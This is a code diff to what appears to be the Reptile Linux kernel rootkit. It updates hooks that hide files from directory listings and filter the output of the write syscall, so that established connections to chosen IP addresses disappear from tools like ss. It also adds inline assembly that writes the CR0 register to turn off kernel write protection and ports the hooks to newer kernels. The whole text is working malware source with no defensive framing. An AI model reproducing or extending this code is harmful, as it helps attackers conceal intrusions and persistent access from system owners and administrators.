@@ -140,6 +140,7 @@ KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen,
 			 loff_t offset, u64 ino, unsigned int d_type)
 {
+	// int ret = -ENOENT;
 	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
@@ -150,6 +151,7 @@ KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
+	// int ret = -ENOENT;
 	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
@@ -325,34 +327,31 @@ out:
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/string.h>
-// #include <linux/syscalls.h>
 #include <linux/unistd.h>
 
 #ifndef CONFIG_HIDE_CONN
 LIST_HEAD(hidden_conn_list);
 #endif
 
-//own add
 typedef unsigned short int uint16;
 typedef unsigned long int uint32;
 #define BigLittleSwap16(A)  ((((uint16)(A) & 0xff00) >> 8) | (((uint16)(A) & 0x00ff) << 8)) 
 
-static unsigned long **sys_call_table_2;
 
-size_t (*orig_write)(unsigned int fd,
-                   const void *buf,
-                   size_t nbytes);
+inline void mywrite_cr0(unsigned long cr0) {
+  asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
+}
 
 void disable_write_protection(void) {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
-    write_cr0(cr0);
+    mywrite_cr0(cr0);
 }
 
 void enable_write_protection(void) {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
-    write_cr0(cr0);
+    mywrite_cr0(cr0);
 }
 
 unsigned char* byte_strstr(void* inBuffer, size_t src_len, void* inSearchStr, size_t find_byte_len )
@@ -382,23 +381,24 @@ unsigned char* byte_strstr(void* inBuffer, size_t src_len, void* inSearchStr, si
     return NULL;
 }
 
-
-asmlinkage size_t my_write(unsigned int fd,
-                            const void *buf,
-                            size_t nbytes){
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
+KHOOK_EXT(ssize_t, ksys_write,  unsigned int, const char __user * , size_t );
+static ssize_t khook_ksys_write( unsigned  int fd,  const char __user *buf,  size_t nbytes)
+{
 	void *tmp = (void *)kmalloc(nbytes, GFP_KERNEL);    
 	struct hidden_conn *hc;
 	size_t ret = 0;
 	char ip_buf[sizeof "aaa.bbb.ccc.ddd"];
 	unsigned char *ucp;
 	int xret;
+
     if (buf == NULL){
 		return nbytes;
 	}
 
     xret = copy_from_user(tmp, buf, nbytes);
     if (tmp == NULL){
-		return (*orig_write)(fd, "nothing", 0);
+		return -1;
 	}
 	
 	list_for_each_entry(hc, &hidden_conn_list, list)
@@ -420,43 +420,57 @@ asmlinkage size_t my_write(unsigned int fd,
 		}
 	}
 
-	return (*orig_write)(fd, buf, nbytes);
+	return KHOOK_ORIGIN(ksys_write, fd, buf, nbytes);
 
 out:
 	return ret;
+} 
+#else
+KHOOK_EXT(ssize_t, sys_write,  unsigned int, const char __user * , size_t );
+static ssize_t khook_sys_write( unsigned  int fd,  const char __user *buf,  size_t nbytes)
+{
+	void *tmp = (void *)kmalloc(nbytes, GFP_KERNEL);    
+	struct hidden_conn *hc;
+	size_t ret = 0;
+	char ip_buf[sizeof "aaa.bbb.ccc.ddd"];
+	unsigned char *ucp;
+	int xret;
 
-}
+    if (buf == NULL){
+		return nbytes;
+	}
 
+    xret = copy_from_user(tmp, buf, nbytes);
+    if (tmp == NULL){
+		return -1;
+	}
+	
+	list_for_each_entry(hc, &hidden_conn_list, list)
+	{
+		char x_port[6] = {0};
+		sprintf(x_port,":%d",BigLittleSwap16(hc->addr.sin_port));
 
-static int filter_init(void) {
-    
-    /* get sys_call_table address */
-	const char* name = "sys_call_table"; 
-	long data[2] = { (long)name, 0 };
-	kallsyms_on_each_symbol((void *)khook_lookup_cb, data);
-    sys_call_table_2 = (unsigned long **)data[1]; // data[1] is sys_call_table address
+        ucp = (unsigned char *)&hc->addr.sin_addr; //inet_ntoa(hc->addr.sin_addr);
+		sprintf(ip_buf, "%d.%d.%d.%d",
+		ucp[0] & 0xff,
+		ucp[1] & 0xff,
+		ucp[2] & 0xff,
+		ucp[3] & 0xff);
 
+		// if ( byte_strstr(tmp, nbytes, "ESTAB",  5) && byte_strstr( tmp, nbytes, x_port, strlen(x_port) ) ) {
+		if ( byte_strstr(tmp, nbytes, "ESTAB",  5) && byte_strstr( tmp, nbytes, ip_buf, strlen(ip_buf) ) ) {
+			ret = -1;
+			goto out;
+		}
+	}
 
-    if (!sys_call_table_2) {
-        return 0;
-    }
-    else{
-        /* get write syscall from sys_call_table */ 
-        orig_write = (void *)sys_call_table_2[__NR_write];
+	return KHOOK_ORIGIN(sys_write, fd, buf, nbytes);
 
-        disable_write_protection();
-        /* replace write*/
-        sys_call_table_2[__NR_write] = (unsigned long *)&my_write;
-        enable_write_protection();
-        return 0;
-    }
-}
+out:
+	return ret;
+} 
+#endif
 
-static void filter_exit(void) {
-    disable_write_protection();
-    sys_call_table_2[__NR_write] = (unsigned long *)orig_write;
-    enable_write_protection();
-}
 // own add end
 #endif
 
@@ -598,18 +612,8 @@ out:
 static int __init reptile_init(void)
 {
 	int ret;
-	char xcmd[512] = {0};
-
 	//own add
-#ifdef CONFIG_HIDE_CONN_FROM_SS
-	int xret;
-	xret = run_cmd("uname -a | grep -i debian");
-	if(xret == 1) {
-		filter_init();
-	}
-#endif
-	// own add end
-
+	char xcmd[512] = {0};
 
 #ifdef CONFIG_FILE_TAMPERING
 	/* Unfortunately I need to use this to ensure in some kernel
@@ -647,13 +651,6 @@ static int __init reptile_init(void)
 
 static void __exit reptile_exit(void)
 {
-#ifdef CONFIG_HIDE_CONN_FROM_SS
-    int ret ;
-    ret = run_cmd("uname -a | grep -i debian");
-    if(ret) {
-		filter_exit();
-    }
-#endif
 
 #ifdef CONFIG_FILE_TAMPERING
 	while(atomic_read(&read_on) != 0) schedule();
